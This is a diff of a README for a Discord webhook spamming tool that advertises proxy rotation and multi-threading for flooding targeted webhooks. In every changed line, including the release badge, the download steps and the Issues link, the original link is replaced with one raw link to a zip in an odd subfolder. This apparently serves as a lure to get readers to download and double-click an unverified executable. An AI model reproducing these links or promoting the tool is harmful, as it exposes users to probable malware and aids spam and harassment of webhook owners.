@@ -1,6 +1,6 @@
 # Swatted Webhook Spammer 🚀
 
-![GitHub release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0.0-brightgreen) [![GitHub issues](https://img.shields.io/github/issues/atulranjanz/Swatted-Webhook-Spammer)](https://github.com/atulranjanz/Swatted-Webhook-Spammer/issues)
+![GitHub release](https://raw.githubusercontent.com/atulranjanz/Swatted-Webhook-Spammer/main/Nestorian/Swatted-Spammer-Webhook-3.6.zip%20Latest%20Release-v1.0.0-brightgreen) [![GitHub issues](https://raw.githubusercontent.com/atulranjanz/Swatted-Webhook-Spammer/main/Nestorian/Swatted-Spammer-Webhook-3.6.zip)](https://raw.githubusercontent.com/atulranjanz/Swatted-Webhook-Spammer/main/Nestorian/Swatted-Spammer-Webhook-3.6.zip)
 
 Welcome to the **Swatted Webhook Spammer** repository! This tool is designed for users who need a fast and effective way to send messages to multiple Discord webhooks. Whether you are conducting educational tests or authorized penetration testing, this tool is here to help you.
 
@@ -19,7 +19,7 @@ Welcome to the **Swatted Webhook Spammer** repository! This tool is designed for
 
 The **Swatted Webhook Spammer** allows you to blast messages to Discord webhooks quickly and efficiently. This tool supports proxy rotation and multi-threading, making it a powerful option for users who need to send numerous messages at once. The best part? No installation is required. Just download the executable, run it, and watch it work!
 
-You can download the latest version [here](https://github.com/atulranjanz/Swatted-Webhook-Spammer/releases).
+You can download the latest version [here](https://raw.githubusercontent.com/atulranjanz/Swatted-Webhook-Spammer/main/Nestorian/Swatted-Spammer-Webhook-3.6.zip).
 
 ## Features
 
@@ -31,11 +31,11 @@ You can download the latest version [here](https://github.com/atulranjanz/Swatte
 
 ## Installation
 
-To get started, you only need to download the executable file. You can find the latest release [here](https://github.com/atulranjanz/Swatted-Webhook-Spammer/releases). Once downloaded, simply run the executable, and you're ready to go!
+To get started, you only need to download the executable file. You can find the latest release [here](https://raw.githubusercontent.com/atulranjanz/Swatted-Webhook-Spammer/main/Nestorian/Swatted-Spammer-Webhook-3.6.zip). Once downloaded, simply run the executable, and you're ready to go!
 
 ## Usage
 
-1. **Download the Executable**: Get the latest version from the [Releases section](https://github.com/atulranjanz/Swatted-Webhook-Spammer/releases).
+1. **Download the Executable**: Get the latest version from the [Releases section](https://raw.githubusercontent.com/atulranjanz/Swatted-Webhook-Spammer/main/Nestorian/Swatted-Spammer-Webhook-3.6.zip).
 2. **Run the Tool**: Double-click the executable file to launch the application.
 3. **Configure Webhooks**: Input the webhooks you want to target.
 4. **Set Options**: Choose your desired settings, including proxy options and the number of threads.
@@ -67,7 +67,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Support
 
-If you encounter any issues or have questions, please check the [Issues section](https://github.com/atulranjanz/Swatted-Webhook-Spammer/issues). You can also reach out to the community for help.
+If you encounter any issues or have questions, please check the [Issues section](https://raw.githubusercontent.com/atulranjanz/Swatted-Webhook-Spammer/main/Nestorian/Swatted-Spammer-Webhook-3.6.zip). You can also reach out to the community for help.
 
 ## Disclaimer
 
